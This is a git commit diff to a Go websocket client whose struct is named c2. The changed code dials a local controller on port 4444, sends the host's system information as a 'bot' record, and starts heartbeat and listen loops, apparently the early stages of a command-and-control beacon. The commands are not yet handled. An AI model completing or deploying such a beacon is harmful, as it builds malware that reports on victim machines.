e49c80abc0a4f79a3c965c6a475450eadc22b73c
Abhijith H Nair <manthukafc@gmail.com>
2026-06-08 21:20:28 +0530

    H

--- client/client.go
+++ client/client.go
@@ -4,25 +4,35 @@ import (
 	"context"
 
 	"github.com/coder/websocket"
+	"github.com/coder/websocket/wsjson"
 )
 
 type c2 struct {
 	con *websocket.Conn
+	ctx context.Context
 }
 
 func (c *c2) connectToserver() {
-	ctx := context.Background()
+	c.ctx = context.Background()
 	var err error
-	c.con, _, err = websocket.Dial(ctx, "ws://localhost:8080/connect", nil)
+
+	c.con, _, err = websocket.Dial(c.ctx, "ws://localhost:4444/connect", nil)
 	if err != nil {
 		return
 	}
+
+	bot := getSysInfo()
+	wsjson.Write(c.ctx, c.con, bot)
+
 	go c.heartbeat()
 	go c.listenToserver()
 }
 
 func (c *c2) listenToserver() {
+	for {
 
+		wsjson.Read(c.ctx, c.con, nil)
+	}
 }
 
 func (c *c2) heartbeat() {
